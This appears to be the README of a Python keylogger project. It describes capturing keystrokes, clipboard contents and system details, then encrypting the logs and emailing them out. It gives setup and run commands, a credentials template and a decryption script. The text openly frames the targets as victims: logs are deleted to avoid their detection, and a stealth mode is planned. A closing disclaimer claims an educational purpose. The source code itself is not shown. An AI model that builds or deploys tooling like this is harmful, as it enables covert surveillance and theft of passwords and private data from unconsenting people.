# Keylogger

This is an advanced keylogger that continuously records keystrokes, logs system information, and monitors clipboard content. The captured data is compressed, encrypted, and sent via email. Once the encrypted logs are sent, the program automatically deletes the logs to remove sensitive information and avoid detection by the victim. The project also includes a script to decrypt and extract the logs.

## Features

- **Keystroke Logging**: Captures keystrokes and logs them into a file.
- **System Information Logging**: Logs system information, including IP addresses, processor details, and more.
- **Clipboard Monitoring**: Monitors and logs clipboard content.
- **Email Notification**: Sends the encrypted log files via email after each iteration.
- **File Encryption**: Compresses and encrypts log files before sending them.
- **File Cleanup**: Deletes logs once email has been sent to remove traces of sensitive data from the victim PC
- **Log Decryption**: A separate script decrypts the received log files and extracts the content.

## Installation

1. **Clone the repository:**

```bash
git clone https://github.com/Ronak-Kumar1023/Keylogger.git
```

2. **Install dependencies:**

Ensure you have Python installed. Then, install the required packages using pip:

```bash
pip install cryptography pynput pyperclip requests python-dotenv
```

3. **Set up environment variables:**

Create a .env file in the project directory and add the following variables:

```
EMAIL_ADDRESS=your_email@gmail.com
EMAIL_PASSWORD=your_password
RECEIVER_EMAIL=receiver_email@gmail.com
ENCRYPTION_KEY=your_fernet_key
FILE_PATH=your_desired_log_directory
```

Ensure the FILE_PATH ends with a slash (/).

4. **Run the keylogger:**

```bash
python keylogger.py
```

5. **Decrypt logs (optional):**

If you receive encrypted logs, you can decrypt them using the decrypt_logs.py script:

```bash
python decrypt_logs.py
```

## Usage
Keylogger Script (keylogger.py)
- Log System Information: Automatically logs system information at the start of the script.
- Monitor Clipboard: Runs a separate thread to continuously monitor clipboard content.
- Keylogging: Listens for keystrokes and logs them into a file.
- Compress and Encrypt: Compresses and encrypts log files after each iteration.
- Send Email: Sends the encrypted log file via email to the specified receiver.
- Delete Files: Deletes the original log files and the encrypted file after sending.
- Decrypt Logs Script (decrypt_logs.py)
- Decrypt and Extract: Decrypts the encrypted .safe files and extracts the content to a specified directory.
- Cleanup: Deletes the decrypted .zip files after extraction.

## Future Improvements
- Advanced Stealth Mode: Implement features to make the keylogger run in the background without detection.
- Multi-platform Support: Extend support for other operating systems like macOS and Linux.
- Error Handling: Improve error handling and logging for better debugging and reliability.


## Disclaimer
This project is intended for educational purposes only. Unauthorized use of this software to monitor or access another person’s computer without their consent is illegal. The developer is not responsible for any misuse or damage caused by this software.

